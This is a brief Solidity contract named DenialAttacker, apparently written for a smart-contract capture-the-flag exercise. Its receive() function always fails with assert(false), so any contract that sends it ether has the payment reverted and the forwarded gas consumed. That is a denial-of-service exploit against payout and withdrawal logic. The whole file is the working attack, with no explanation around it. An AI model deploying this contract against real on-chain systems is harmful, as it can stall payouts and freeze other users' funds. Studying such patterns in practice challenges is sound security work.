// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract DenialAttacker {
    receive() external payable {
        assert(false);
    }
}
